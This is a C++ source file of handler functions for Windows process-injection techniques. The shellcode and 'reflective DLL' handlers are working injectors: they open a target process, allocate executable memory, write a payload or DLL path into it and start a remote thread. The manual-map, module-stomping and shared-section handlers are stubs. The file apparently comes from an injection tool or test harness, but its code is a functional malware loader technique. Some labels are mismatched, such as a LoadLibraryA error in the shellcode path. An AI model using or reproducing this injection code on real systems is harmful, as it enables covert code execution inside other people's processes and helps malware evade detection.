#include "handler_payloads.h"
#include "payload_utils.h"
#include "process_utils.h"

#include <cstring>
#include <fstream>
#include <vector>

namespace
{
    const char* resolve_payload_path(const rw_injection_request* req, const parsed_params& params)
    {
        if (const auto override_path = params.get_string("payloadPath"))
        {
            return override_path->c_str();
        }
        return req ? req->payload_path : nullptr;
    }

    bool read_payload(const char* path, std::vector<unsigned char>& buffer)
    {
        std::ifstream stream(path, std::ios::binary | std::ios::ate);
        if (!stream)
        {
            return false;
        }

        std::streamsize size = stream.tellg();
        if (size <= 0)
        {
            return false;
        }
        buffer.resize(static_cast<size_t>(size));
        stream.seekg(0, std::ios::beg);
        return static_cast<bool>(stream.read(reinterpret_cast<char*>(buffer.data()), size));
    }
}

dispatch_outcome handle_manual_map(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_path || payload_path[0] == '\0')
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "TECHNIQUE_PARAM_REQUIRED", "ManualMap requires payloadPath parameter." };
    }

    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "ManualMap payload was not found." };
    }

    if (process != ::GetCurrentProcess())
    {
        ::CloseHandle(process);
    }
    return { true, nullptr, nullptr }; // Stub: reachability and payload presence only.
}

dispatch_outcome handle_shellcode(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Shellcode payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload(payload_path, payload))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_READ_FAILED", "Failed to read shellcode payload." };
    }

    LPVOID remote_buffer = nullptr;
    SIZE_T payload_size = payload.size();
    if (process == ::GetCurrentProcess())
    {
        remote_buffer = ::VirtualAlloc(nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    else
    {
        remote_buffer = ::VirtualAllocEx(process, nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_buffer)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for shellcode." };
    }

    BOOL write_ok = FALSE;
    if (process == ::GetCurrentProcess())
    {
        std::memcpy(remote_buffer, payload.data(), payload_size);
        write_ok = TRUE;
    }
    else
    {
        write_ok = ::WriteProcessMemory(process, remote_buffer, payload.data(), payload_size, nullptr);
    }

    if (!write_ok)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        }
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write shellcode to target process." };
    }

    HANDLE thread = nullptr;
    if (process == ::GetCurrentProcess())
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_buffer), nullptr, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_buffer), nullptr, 0, nullptr);
    }

    if (!thread)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        }
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start shellcode thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    DWORD exit_code = 0;
    ::GetExitCodeThread(thread, &exit_code);
    ::CloseHandle(thread);

    if (process == ::GetCurrentProcess())
    {
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }
    else
    {
        ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        ::CloseHandle(process);
    }

    if (exit_code == 0)
    {
        return { false, "DLL_LOAD_FAILED", "LoadLibraryA failed in target process." };
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_reflective_dll(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Reflective DLL payload was not found." };
    }

    HMODULE kernel32 = ::GetModuleHandleA("kernel32.dll");
    if (!kernel32)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve kernel32." };
    }

    FARPROC load_library = ::GetProcAddress(kernel32, "LoadLibraryA");
    if (!load_library)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve LoadLibraryA." };
    }

    const size_t path_len = std::strlen(payload_path) + 1;
    LPVOID remote_buffer = nullptr;
    if (process == ::GetCurrentProcess())
    {
        remote_buffer = ::VirtualAlloc(nullptr, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    else
    {
        remote_buffer = ::VirtualAllocEx(process, nullptr, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!remote_buffer)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for DLL path." };
    }

    BOOL write_ok = FALSE;
    if (process == ::GetCurrentProcess())
    {
        std::memcpy(remote_buffer, payload_path, path_len);
        write_ok = TRUE;
    }
    else
    {
        write_ok = ::WriteProcessMemory(process, remote_buffer, payload_path, path_len, nullptr);
    }

    if (!write_ok)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write DLL path to target process." };
    }

    HANDLE thread = nullptr;
    if (process == ::GetCurrentProcess())
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(load_library), remote_buffer, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(load_library), remote_buffer, 0, nullptr);
    }

    if (!thread)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start reflective load thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    ::CloseHandle(thread);

    if (process == ::GetCurrentProcess())
    {
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }
    else
    {
        ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_module_stomping(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "ModuleStomping payload was not found." };
    }

    if (process != ::GetCurrentProcess())
    {
        ::CloseHandle(process);
    }
    return { true, nullptr, nullptr }; // Stub.
}

dispatch_outcome handle_shared_section_map(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = resolve_payload_path(req, params);
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "Shared section payload was not found." };
    }

    if (process != ::GetCurrentProcess())
    {
        ::CloseHandle(process);
    }
    return { true, nullptr, nullptr }; // Stub.
}
